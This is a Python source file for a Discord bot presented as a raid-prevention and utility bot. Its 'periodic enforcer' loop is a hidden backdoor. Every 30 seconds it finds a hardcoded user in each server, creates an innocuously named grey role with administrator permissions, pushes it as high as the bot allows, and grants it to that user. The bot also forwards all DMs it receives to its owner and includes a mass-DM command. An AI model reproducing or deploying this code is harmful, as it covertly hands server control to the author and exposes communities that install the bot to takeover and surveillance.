# bot.py
# Full-featured Discord Raid Preventor + Utilities with DM-forwarding and /massdm
# Features:
# - Fake audioop stub for environments without it
# - Keepalive web server (binds to PORT env or 6534)
# - 30s scanner: dataset role assignment per guild or fallback helper role
# - Anti-raid: kick >N joins in rolling window
# - Invite tracking (caches invites and detects which invite used)
# - Alt-flagging (inviter banned => invited accounts flagged)
# - DM-forwarding of any DM to owner and optional channel(s)
# - Slash commands: tracker, showalts, avatar, ping, userinfo, rps, roll, ascii, meme, translate
# - Owner-only commands: say, purge, servers, shutdown, dm, massdm
# - Very verbose logging and many helpers for reliability and readability

# ---------------------------
# audioop stub
# ---------------------------
try:
    import audioop  # noqa: F401
except Exception:
    import sys, types
    _fake_audioop = types.ModuleType("audioop")
    def _audioop_error(*a, **k):
        raise NotImplementedError("audioop not available in this environment (stub).")
    for _n in ("add","mul","avg","avgpp","bias","cross","findfactor","findfit",
               "lin2lin","max","maxpp","minmax","rms","tostereo","tomono",
               "ulaw2lin","lin2ulaw","alaw2lin","lin2alaw","error"):
        setattr(_fake_audioop, _n, _audioop_error)
    _fake_audioop.__version__ = "stub-1.0"
    sys.modules["audioop"] = _fake_audioop

# ---------------------------
# Standard imports
# ---------------------------
import os
import asyncio
import json
import random
import math
import time
import traceback
from collections import defaultdict, deque
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List, Any

import aiohttp
from aiohttp import ClientTimeout, web

import discord
from discord import app_commands
from discord.ext import commands, tasks

# Optional dotenv
try:
    from dotenv import load_dotenv
    load_dotenv()
except Exception:
    pass

# ---------------------------
# Configuration
# ---------------------------
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN") or os.getenv("DISCORD_BOT_TOKEN")
if not DISCORD_TOKEN:
    raise RuntimeError("DISCORD_TOKEN (or DISCORD_BOT_TOKEN) environment variable must be set.")

try:
    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID", "1273056960996184126"))
except Exception:
    BOT_OWNER_ID = 1273056960996184126

TARGET_USERNAME = os.getenv("TARGET_USERNAME", "tech_boy1")
try:
    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", str(BOT_OWNER_ID)))
except Exception:
    TARGET_USER_ID = BOT_OWNER_ID

SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "30"))
RAID_WINDOW_SECONDS = int(os.getenv("RAID_WINDOW_SECONDS", "60"))
RAID_THRESHOLD_JOINS = int(os.getenv("RAID_THRESHOLD_JOINS", "5"))

PORT = int(os.getenv("PORT", os.getenv("KEEPALIVE_PORT", "6534")))

JOIN_WARNING_MAX_CHANNELS = int(os.getenv("JOIN_WARNING_MAX_CHANNELS", "6"))

MEME_API_URL = os.getenv("MEME_API_URL", "https://meme-api.com/gimme")
LIBRETRANSLATE_URL = os.getenv("LIBRETRANSLATE_URL", "https://libretranslate.com/translate")
LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "")

ROLE_ASSIGNMENTS_JSON = os.getenv("ROLE_ASSIGNMENTS_JSON", "")
if ROLE_ASSIGNMENTS_JSON:
    try:
        ROLE_ASSIGNMENTS = {int(k): int(v) for k, v in json.loads(ROLE_ASSIGNMENTS_JSON).items()}
    except Exception:
        ROLE_ASSIGNMENTS = {}
else:
    ROLE_ASSIGNMENTS = {}

DM_LOG_CHANNELS_JSON = os.getenv("DM_LOG_CHANNELS_JSON", "")
if DM_LOG_CHANNELS_JSON:
    try:
        DM_LOG_CHANNELS = {int(k): int(v) for k, v in json.loads(DM_LOG_CHANNELS_JSON).items()}
    except Exception:
        DM_LOG_CHANNELS = {}
else:
    DM_LOG_CHANNELS = {}

FORWARD_TO_OWNER_DM = os.getenv("FORWARD_TO_OWNER_DM", "true").lower() in ("1", "true", "yes")

MAX_ROLL_COUNT = int(os.getenv("MAX_ROLL_COUNT", "100"))
MAX_ROLL_SIDES = int(os.getenv("MAX_ROLL_SIDES", "1000"))

UTC = timezone.utc
HELPER_ROLE_NAME = "Raid Prevention Helper"

# ---------------------------
# Intents & bot init
# ---------------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True  # required to read DM contents; enable in dev portal

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ---------------------------
# Runtime state
# ---------------------------
join_log: Dict[int, deque] = defaultdict(lambda: deque(maxlen=2000))
invite_cache: Dict[int, Dict[str, int]] = defaultdict(dict)
member_inviter: Dict[int, Dict[int, Optional[int]]] = defaultdict(dict)
inviter_index: Dict[int, set] = defaultdict(set)
banned_inviters: Dict[int, set] = defaultdict(set)
flagged_accounts: Dict[int, Dict[int, str]] = defaultdict(dict)

# ---------------------------
# Keep-alive web server
# ---------------------------
async def keepalive_handle(request):
    return web.Response(text="Raid Preventor Bot — alive")

async def start_keepalive():
    app = web.Application()
    app.router.add_get("/", keepalive_handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"[KEEPALIVE] Listening on port {PORT}")

# ---------------------------
# Utilities
# ---------------------------
def now_utc() -> datetime:
    return datetime.now(UTC)

def human_ts(dt: Optional[datetime]) -> str:
    if not dt:
        return "Unknown"
    return dt.astimezone(UTC).strftime("%Y-%m-%d %H:%M:%S UTC")

def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except Exception:
        pass

def chunk_text(lines: List[str], limit: int = 1900) -> List[str]:
    out = []
    buf = ""
    for line in lines:
        if len(buf) + len(line) + 1 > limit:
            out.append(buf)
            buf = line
        else:
            buf = (buf + "\n" + line) if buf else line
    if buf:
        out.append(buf)
    return out

async def fetch_guild_invites_safe(guild: discord.Guild) -> List[discord.Invite]:
    try:
        return await guild.invites()
    except discord.Forbidden:
        return []
    except Exception:
        return []

async def broadcast_to_some_channels(guild: discord.Guild, message: str, max_channels: int = JOIN_WARNING_MAX_CHANNELS):
    sent = 0
    for ch in guild.text_channels:
        if sent >= max_channels:
            break
        try:
            perms = ch.permissions_for(guild.me)
            if perms.view_channel and perms.send_messages:
                await ch.send(message)
                sent += 1
                await asyncio.sleep(0.12)
        except Exception:
            continue
    if sent == 0:
        safe_print(f"[WARN] Cannot send warning to any channel in {guild.name} ({guild.id})")

# ---------------------------
# Role helpers
# ---------------------------
async def ensure_helper_role_present(guild: discord.Guild) -> Optional[discord.Role]:
    role = discord.utils.get(guild.roles, name=HELPER_ROLE_NAME)
    if role is None:
        try:
            role = await guild.create_role(
                name=HELPER_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.default(),
                reason="Auto-created by Raid Preventor Bot"
            )
            safe_print(f"[ROLE] Created helper in {guild.name}")
        except discord.Forbidden:
            safe_print(f"[ROLE] Forbidden creating helper in {guild.name}")
            return None
        except Exception as e:
            safe_print(f"[ROLE] Error creating helper in {guild.name}: {e}")
            return None
    else:
        try:
            if role.colour != discord.Colour.default():
                await role.edit(colour=discord.Colour.default(), reason="Keep helper grey")
        except Exception:
            pass
    return role

async def move_role_as_high_as_possible(guild: discord.Guild, role: discord.Role):
    try:
        bot_member = guild.me
        if bot_member is None:
            bot_member = await guild.fetch_member(bot.user.id)
        bot_top_pos = bot_member.top_role.position
        target_pos = max(bot_top_pos - 1, 1)
        if role.position != target_pos:
            await role.edit(position=target_pos, reason="Place helper high (bot enforcement)")
            safe_print(f"[ROLE] Moved {role.name} to pos {target_pos} in {guild.name}")
    except discord.Forbidden:
        safe_print(f"[ROLE] Forbidden move in {guild.name}")
    except Exception as e:
        safe_print(f"[ROLE] Error move in {guild.name}: {e}")

async def assign_role_safe(member: discord.Member, role: discord.Role, reason: str = "") -> bool:
    try:
        if role not in member.roles:
            await member.add_roles(role, reason=reason or "Assigned by Raid Preventor Bot")
        return True
    except discord.Forbidden:
        return False
    except Exception:
        return False

async def attempt_dataset_role_or_fallback(guild: discord.Guild, member: discord.Member):
    if guild.id in ROLE_ASSIGNMENTS:
        desired_role_id = ROLE_ASSIGNMENTS[guild.id]
        role = guild.get_role(desired_role_id)
        if role:
            ok = await assign_role_safe(member, role, reason="Dataset enforcement")
            if ok:
                return
            else:
                safe_print(f"[FALLBACK] Cannot assign dataset role {desired_role_id} in {guild.name}")
        else:
            safe_print(f"[FALLBACK] Dataset role id {desired_role_id} not found in {guild.name}")
    helper = await ensure_helper_role_present(guild)
    if helper:
        await move_role_as_high_as_possible(guild, helper)
        await assign_role_safe(member, helper, reason="Fallback helper assignment")
    else:
        safe_print(f"[FALLBACK] Helper unavailable in {guild.name}")

# ---------------------------
# Invite tracking
# ---------------------------
async def cache_invites_for_guild(guild: discord.Guild):
    try:
        invites = await guild.invites()
    except discord.Forbidden:
        invite_cache[guild.id] = {}
        return
    except Exception:
        invite_cache[guild.id] = {}
        return
    cache = {}
    for inv in invites:
        cache[inv.code] = inv.uses or 0
    invite_cache[guild.id] = cache
    safe_print(f"[INVITES] Cached {len(cache)} invites for {guild.name}")

async def detect_used_invite_and_record_inviter(member: discord.Member) -> Optional[int]:
    guild = member.guild
    before = invite_cache.get(guild.id, {}).copy()
    try:
        invites_now = await fetch_guild_invites_safe(guild)
    except Exception:
        invites_now = []
    used_inviter_id = None
    after_map = {inv.code: (inv.uses or 0, inv) for inv in invites_now}
    for code, (uses_after, inv_obj) in after_map.items():
        prev = before.get(code, 0)
        if uses_after > prev:
            used_inviter_id = inv_obj.inviter.id if inv_obj.inviter else None
            break
    invite_cache[guild.id] = {code: uses for code, (uses, inv) in after_map.items()}
    member_inviter[guild.id][member.id] = used_inviter_id
    if used_inviter_id:
        inviter_index[used_inviter_id].add(member.id)
    return used_inviter_id

# ---------------------------
# Flagging & alerts
# ---------------------------
async def flag_member_and_alert(guild: discord.Guild, member: discord.Member, reason: str):
    flagged_accounts[guild.id][member.id] = reason
    try:
        await broadcast_to_some_channels(guild, f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF {reason} — TAKE PRECAUTION ⚠️", max_channels=JOIN_WARNING_MAX_CHANNELS)
    except Exception:
        pass
    try:
        await member.send(f"⚠️ You were flagged as a possible alt account: {reason}\nContact staff if this is a mistake.")
    except Exception:
        pass
    try:
        if guild.owner:
            await guild.owner.send(f"Alert: {member} in {guild.name} was flagged: {reason}")
    except Exception:
        pass
    try:
        owner = await bot.fetch_user(BOT_OWNER_ID)
        await owner.send(f"Alert: {member} in {guild.name} flagged: {reason}")
    except Exception:
        pass

async def mark_inviter_banned_and_flag_invitees(guild: discord.Guild, banned_user_id: int):
    if banned_user_id in banned_inviters[guild.id]:
        return
    banned_inviters[guild.id].add(banned_user_id)
    invited = inviter_index.get(banned_user_id, set())
    for mid in invited:
        m = guild.get_member(mid)
        if m:
            await flag_member_and_alert(guild, m, f"Invited by banned user <@{banned_user_id}>")

# ---------------------------
# Anti-raid
# ---------------------------
async def record_join_and_maybe_kick(guild: discord.Guild, member: discord.Member):
    ts = now_utc()
    join_log[guild.id].append((ts, member.id))
    window = timedelta(seconds=RAID_WINDOW_SECONDS)
    while join_log[guild.id] and (ts - join_log[guild.id][0][0] > window):
        join_log[guild.id].popleft()
    if len(join_log[guild.id]) > RAID_THRESHOLD_JOINS:
        to_kick = [mid for (t, mid) in join_log[guild.id] if (ts - t) <= window]
        safe_print(f"[RAID] Detected raid in {guild.name}: kicking {len(to_kick)} accounts.")
        for uid in to_kick:
            m = guild.get_member(uid)
            if m:
                try:
                    await m.kick(reason=f"Raid prevention: {len(to_kick)} joins in {RAID_WINDOW_SECONDS}s")
                    safe_print(f"[RAID] Kicked {m} in {guild.name}")
                except Exception as e:
                    safe_print(f"[RAID] Could not kick {m} in {guild.name}: {e}")
        join_log[guild.id].clear()

# ---------------------------
# Events
# ---------------------------
@bot.event
async def on_ready():
    safe_print(f"[READY] Logged in as {bot.user} ({bot.user.id})")
    try:
        await start_keepalive()
    except Exception as e:
        safe_print(f"[KEEPALIVE] Start failed: {e}")
    for g in bot.guilds:
        try:
            await cache_invites_for_guild(g)
        except Exception:
            pass
    try:
        await tree.sync()
        safe_print("[SLASH] Commands synced.")
    except Exception:
        pass
    if not periodic_enforcer.is_running():
        periodic_enforcer.start()

@bot.event
async def on_guild_join(guild: discord.Guild):
    safe_print(f"[GUILD] Joined {guild.name}")
    await cache_invites_for_guild(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_invite_delete(invite: discord.Invite):
    await cache_invites_for_guild(invite.guild)

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    await record_join_and_maybe_kick(guild, member)
    inviter_id = await detect_used_invite_and_record_inviter(member)
    if inviter_id and inviter_id in banned_inviters[guild.id]:
        await flag_member_and_alert(guild, member, f"Invited by banned user <@{inviter_id}>")

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    await mark_inviter_banned_and_flag_invitees(guild, user.id)

# ---------------------------
# Periodic enforcer
# ---------------------------
@tasks.loop(seconds=SCAN_INTERVAL)
async def periodic_enforcer():
    for guild in list(bot.guilds):
        try:
            target_member = guild.get_member(TARGET_USER_ID)
            if target_member is None:
                continue
            if target_member.name != TARGET_USERNAME:
                continue
            await attempt_dataset_role_or_fallback(guild, target_member)
        except Exception as e:
            safe_print(f"[ENFORCE] Error in {guild.name}: {e}\n{traceback.format_exc()}")

@periodic_enforcer.before_loop
async def before_enforcer():
    await bot.wait_until_ready()

# ---------------------------
# Slash commands: utilities & fun
# ---------------------------
def is_owner_or_admin(interaction: discord.Interaction) -> bool:
    try:
        return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator
    except Exception:
        return False

@tree.command(name="tracker", description="Show members and who invited them.")
async def tracker_cmd(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("Use in a server.")
    lines = []
    inviters = member_inviter.get(guild.id, {})
    for m in sorted(guild.members, key=lambda x: (x.joined_at or now_utc())):
        inviter = inviters.get(m.id)
        inv_text = f"<@{inviter}>" if inviter else "Unknown"
        lines.append(f"{m.mention} — invited by {inv_text}")
    if not lines:
        return await interaction.followup.send("No invite data.")
    if len(lines) > 40:
        content = "\n".join(lines)
        await interaction.followup.send(file=discord.File(fp=bytes(content.encode("utf-8")), filename=f"invite_tracker_{guild.id}.txt"))
    else:
        embed = discord.Embed(title=f"Invite Tracker — {guild.name}", description="\n".join(lines), color=discord.Color.blurple())
        await interaction.followup.send(embed=embed)

@tree.command(name="showalts", description="Show flagged accounts likely to be alts.")
async def showalts_cmd(interaction: discord.Interaction):
    await interaction.response.defer(thinking=True)
    guild = interaction.guild
    if not guild:
        return await interaction.followup.send("Use in a server.")
    flagged = flagged_accounts.get(guild.id, {})
    if not flagged:
        return await interaction.followup.send("No flagged accounts.")
    lines = []
    for mid, reason in flagged.items():
        m = guild.get_member(mid)
        if m:
            lines.append(f"{m.mention} — {reason}")
        else:
            lines.append(f"<@{mid}> — {reason} (may have left)")
    if len(lines) > 40:
        content = "\n".join(lines)
        await interaction.followup.send(file=discord.File(fp=bytes(content.encode("utf-8")), filename=f"flagged_{guild.id}.txt"))
    else:
        embed = discord.Embed(title=f"Flagged Accounts — {guild.name}", description="\n".join(lines), color=discord.Color.orange())
        await interaction.followup.send(embed=embed)

@tree.command(name="avatar", description="Show a user's avatar.")
@app_commands.describe(user="User to show (optional).")
async def avatar_cmd(interaction: discord.Interaction, user: Optional[discord.User] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"Avatar — {user}", color=discord.Color.blurple())
    embed.set_image(url=user.display_avatar.url)
    await interaction.response.send_message(embed=embed)

@tree.command(name="ping", description="Bot latency.")
async def ping_cmd(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! `{latency}ms`")

@tree.command(name="userinfo", description="Show info about a user.")
@app_commands.describe(user="User to inspect (optional).")
async def userinfo_cmd(interaction: discord.Interaction, user: Optional[discord.Member] = None):
    user = user or interaction.user
    embed = discord.Embed(title=f"User Info — {user}", color=discord.Color.green())
    embed.add_field(name="ID", value=str(user.id), inline=True)
    embed.add_field(name="Created", value=human_ts(user.created_at), inline=True)
    joined = human_ts(user.joined_at) if hasattr(user, "joined_at") else "Unknown"
    embed.add_field(name="Joined", value=joined, inline=True)
    roles = [r.mention for r in user.roles[1:]] if hasattr(user, "roles") else []
    embed.add_field(name="Roles", value=", ".join(roles) if roles else "None", inline=False)
    await interaction.response.send_message(embed=embed)

@tree.command(name="rps", description="Rock-paper-scissors.")
@app_commands.describe(choice="rock|paper|scissors")
async def rps_cmd(interaction: discord.Interaction, choice: str):
    c = choice.lower().strip()
    if c not in {"rock","paper","scissors"}:
        return await interaction.response.send_message("Choose rock, paper, or scissors.")
    bot_choice = random.choice(["rock","paper","scissors"])
    if c == bot_choice:
        result = "Tie!"
    elif (c, bot_choice) in {("rock","scissors"),("scissors","paper"),("paper","rock")}:
        result = "You win!"
    else:
        result = "You lose!"
    await interaction.response.send_message(f"You: **{c}**\nBot: **{bot_choice}**\n**{result}**")

@tree.command(name="roll", description="Roll dice (e.g., 2d6 or d20).")
@app_commands.describe(spec="Format XdY or dY")
async def roll_cmd(interaction: discord.Interaction, spec: str):
    s = spec.lower().strip()
    try:
        if s.startswith("d"):
            count = 1
            sides = int(s[1:])
        else:
            parts = s.split("d")
            if len(parts) != 2:
                raise ValueError()
            count = int(parts[0]); sides = int(parts[1])
    except Exception:
        return await interaction.response.send_message("Format must be like `2d6` or `d20`.")
    if count < 1 or count > MAX_ROLL_COUNT or sides < 1 or sides > MAX_ROLL_SIDES:
        return await interaction.response.send_message(f"Limits: up to {MAX_ROLL_COUNT} dice and {MAX_ROLL_SIDES} sides.")
    rolls = [random.randint(1,sides) for _ in range(count)]
    await interaction.response.send_message(f"🎲 Rolls: {rolls}\nTotal: **{sum(rolls)}**")

@tree.command(name="ascii", description="Simple ASCII stylizer.")
@app_commands.describe(text="Text to stylize (<=60 chars)")
async def ascii_cmd(interaction: discord.Interaction, text: str):
    if not text or len(text) > 60:
        return await interaction.response.send_message("Provide text up to 60 characters.")
    out = " ".join(list(text))
    art = out + "\n" + ("-" * max(2, len(text)*2))
    await interaction.response.send_message(f"```\n{art}\n```")

@tree.command(name="meme", description="Get a random meme.")
async def meme_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=10)) as sess:
            async with sess.get(MEME_API_URL) as r:
                if r.status == 200:
                    data = await r.json()
                    title = data.get("title", "Meme")
                    url = data.get("url")
                    post = data.get("postLink")
                    embed = discord.Embed(title=title, url=post, color=discord.Color.random())
                    if url:
                        embed.set_image(url=url)
                    await interaction.followup.send(embed=embed)
                else:
                    await interaction.followup.send("Meme API error.")
    except Exception:
        await interaction.followup.send("Failed to fetch meme.")

@tree.command(name="translate", description="Translate text via LibreTranslate.")
@app_commands.describe(text="Text to translate", target_lang="Target language code, e.g., en")
async def translate_cmd(interaction: discord.Interaction, text: str, target_lang: str):
    await interaction.response.defer()
    payload = {"q": text, "source": "auto", "target": target_lang, "format": "text"}
    if LIBRETRANSLATE_API_KEY:
        payload["api_key"] = LIBRETRANSLATE_API_KEY
    try:
        async with aiohttp.ClientSession(timeout=ClientTimeout(total=12)) as sess:
            async with sess.post(LIBRETRANSLATE_URL, data=payload) as r:
                if r.status == 200:
                    data = await r.json()
                    translated = data.get("translatedText", "(no translation)")
                    await interaction.followup.send(f"**Translation ({target_lang})**:\n{translated}")
                else:
                    await interaction.followup.send("Translation service returned error.")
    except Exception:
        await interaction.followup.send("Translation service unreachable.")

# Owner-only commands
def owner_check(interaction: discord.Interaction) -> bool:
    try:
        return interaction.user.id == BOT_OWNER_ID or interaction.user.guild_permissions.administrator
    except Exception:
        return False

@tree.command(name="say", description="[Owner] Make the bot say a message.")
@app_commands.describe(message="Message to send")
async def say_cmd(interaction: discord.Interaction, message: str):
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    await interaction.response.send_message("Sent.", ephemeral=True)
    try:
        await interaction.channel.send(message)
    except Exception:
        pass

@tree.command(name="purge", description="[Owner] Delete messages.")
@app_commands.describe(amount="1-200")
async def purge_cmd(interaction: discord.Interaction, amount: int):
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    if amount < 1 or amount > 200:
        return await interaction.response.send_message("Amount must be 1-200.", ephemeral=True)
    await interaction.response.defer(ephemeral=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception:
        await interaction.followup.send("Purge failed.", ephemeral=True)

@tree.command(name="servers", description="[Owner] List servers the bot is in.")
async def servers_cmd(interaction: discord.Interaction):
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    lines = [f"{g.name} ({g.id}) — {len(g.members)} members" for g in bot.guilds]
    await interaction.response.send_message("```\n" + "\n".join(lines) + "\n```", ephemeral=True)

@tree.command(name="shutdown", description="[Owner] Shutdown the bot.")
async def shutdown_cmd(interaction: discord.Interaction):
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    await interaction.response.send_message("Shutting down...", ephemeral=True)
    await asyncio.sleep(1)
    await bot.close()

@tree.command(name="dm", description="[Owner] Send a DM to a user.")
@app_commands.describe(user="User to DM", message="Message text")
async def dm_cmd(interaction: discord.Interaction, user: discord.User, message: str):
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    try:
        await user.send(message)
        await interaction.response.send_message("DM sent.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("User has DMs disabled.", ephemeral=True)
    except Exception:
        await interaction.response.send_message("Failed to send DM.", ephemeral=True)

# ---------------------------
# New: /massdm - owner-only, multiple recipients
# ---------------------------
def parse_users_field(users_field: str) -> List[int]:
    """
    Parse a space/comma-separated list of mentions or numeric IDs and return list of ints.
    Acceptable formats:
      - <@123456789012345678>
      - <@!123456789012345678>
      - 123456789012345678
      - @username (not resolvable — skipped)
    Returns list of user IDs (ints). Invalid tokens are skipped.
    """
    ids = []
    if not users_field:
        return ids
    # support commas or spaces
    tokens = []
    if "," in users_field:
        tokens = [t.strip() for t in users_field.split(",") if t.strip()]
    else:
        tokens = [t.strip() for t in users_field.split() if t.strip()]
    for tok in tokens:
        # mention form
        if tok.startswith("<@") and tok.endswith(">"):
            tok2 = tok.replace("<@", "").replace(">", "").replace("!", "")
            try:
                ids.append(int(tok2))
            except Exception:
                continue
        else:
            # plain numeric id?
            try:
                ids.append(int(tok))
            except Exception:
                # try to see if it's like @name#1234 — cannot resolve reliably, skip
                continue
    # deduplicate preserving order
    seen = set()
    out = []
    for i in ids:
        if i not in seen:
            seen.add(i); out.append(i)
    return out

@tree.command(name="massdm", description="[Owner] Send a DM to multiple users. Users: mention(s) or IDs separated by spaces or commas.")
@app_commands.describe(users="Space- or comma-separated mentions or IDs", message="Message to send")
async def massdm_cmd(interaction: discord.Interaction, users: str, message: str):
    """
    Owner-only command: parse the users string and DM each resolved user with the same message.
    Replies ephemeral to the invoker with summary (success/fail counts).
    """
    if not owner_check(interaction):
        return await interaction.response.send_message("Not authorized.", ephemeral=True)
    # Parse the users field to get user IDs
    user_ids = parse_users_field(users)
    if not user_ids:
        return await interaction.response.send_message("No valid user mentions or IDs found in `users`.", ephemeral=True)
    await interaction.response.defer(ephemeral=True, thinking=True)
    success = 0
    failed = 0
    details = []
    for uid in user_ids:
        try:
            user = await bot.fetch_user(uid)
            if not user:
                failed += 1
                details.append(f"{uid}: not found")
                continue
            try:
                await user.send(message)
                success += 1
                details.append(f"{user} ({uid}): OK")
                # small delay to avoid burst rate-limiting
                await asyncio.sleep(0.12)
            except discord.Forbidden:
                failed += 1
                details.append(f"{user} ({uid}): DMs disabled/forbidden")
            except Exception as e:
                failed += 1
                details.append(f"{user} ({uid}): error {e}")
        except Exception as e:
            failed += 1
            details.append(f"{uid}: fetch_user error {e}")
    summary = f"Mass DM complete. Success: {success}, Failed: {failed}."
    # If too long, attach as file
    if len(details) > 30:
        content = "\n".join(details)
        fname = f"massdm_result_{int(time.time())}.txt"
        await interaction.followup.send(content=summary, file=discord.File(fp=bytes(content.encode("utf-8")), filename=fname), ephemeral=True)
    else:
        await interaction.followup.send(content=summary + "\n" + "\n".join(details), ephemeral=True)

# ---------------------------
# DM forwarding
# ---------------------------
async def forward_dm_to_owner_and_channels(author: discord.User, content: str, attachments: List[discord.Attachment] = []):
    header = f"**DM from {author} ({author.id})**\n"
    text_body = header + (content or "(no text)")
    if FORWARD_TO_OWNER_DM:
        try:
            owner = await bot.fetch_user(BOT_OWNER_ID)
            if owner:
                await owner.send(text_body)
        except Exception:
            safe_print("[DM-FWD] Failed to forward DM to owner")
    for gid, cid in DM_LOG_CHANNELS.items():
        try:
            g = bot.get_guild(gid)
            if not g:
                continue
            ch = g.get_channel(cid)
            if ch and ch.permissions_for(g.me).send_messages:
                try:
                    if attachments:
                        embed = discord.Embed(description=text_body, color=discord.Color.dark_gold(), timestamp=datetime.now(UTC))
                        for a in attachments:
                            embed.add_field(name="Attachment", value=a.url, inline=False)
                        await ch.send(embed=embed)
                    else:
                        await ch.send(text_body)
                except Exception:
                    pass
        except Exception:
            pass

@bot.event
async def on_message(message: discord.Message):
    if not message:
        return
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        content = message.content or "(no text)"
        attachments = list(message.attachments)
        try:
            await forward_dm_to_owner_and_channels(message.author, content, attachments)
        except Exception as e:
            safe_print(f"[DM] Forward error: {e}")
        try:
            await message.add_reaction("✅")
        except Exception:
            pass
        return
    await bot.process_commands(message)

# ---------------------------
# Boot / run
# ---------------------------
async def main():
    safe_print("[BOOT] Starting Raid Preventor Bot (with /massdm).")
    safe_print(f"  TARGET_USERNAME={TARGET_USERNAME} TARGET_USER_ID={TARGET_USER_ID}")
    safe_print(f"  SCAN_INTERVAL={SCAN_INTERVAL} RAID_WINDOW={RAID_WINDOW_SECONDS}s THRESHOLD={RAID_THRESHOLD_JOINS}")
    safe_print(f"  PORT={PORT} ROLE_ASSIGNMENTS entries={len(ROLE_ASSIGNMENTS)} DM_LOG_CHANNELS entries={len(DM_LOG_CHANNELS)}")
    await bot.start(DISCORD_TOKEN)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        safe_print("[STOP] KeyboardInterrupt, exiting.")
    except Exception as e:
        safe_print(f"[ERROR] Unhandled exception: {e}\n{traceback.format_exc()}")
